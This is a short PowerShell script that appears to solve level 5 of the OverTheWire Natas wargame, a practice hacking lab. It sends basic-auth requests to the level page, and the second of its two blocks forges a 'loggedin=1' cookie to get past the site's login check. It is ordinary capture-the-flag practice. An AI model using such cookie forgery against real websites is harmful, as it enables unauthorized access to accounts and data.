
$currentLevel = 5
$currentPassword = ''
$currentURL = "http://natas$($currentLevel).natas.labs.overthewire.org"
$currentUsername = "natas$currentLevel"
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $currentUsername,$(convertTo-SecureString -AsPlainText -Force -String $currentPassword)

$page = Invoke-WebRequest $currentURL -Credential $credential -SessionVariable session
$page.Rawcontent

$currentLevel = 5
$currentPassword = ''
$currentURL = "http://natas$($currentLevel).natas.labs.overthewire.org"
$currentUsername = "natas$currentLevel"
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $currentUsername,$(convertTo-SecureString -AsPlainText -Force -String $currentPassword)

$sess = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cookie = New-Object System.Net.Cookie
$cookie.Name = 'loggedin'
$cookie.Value = 1
$cookie.Domain = "natas5.natas.labs.overthewire.org"
$sess.cookies.add($cookie)

$page = Invoke-WebRequest $currentURL -Credential $credential -WebSession $sess
$page.Rawcontent


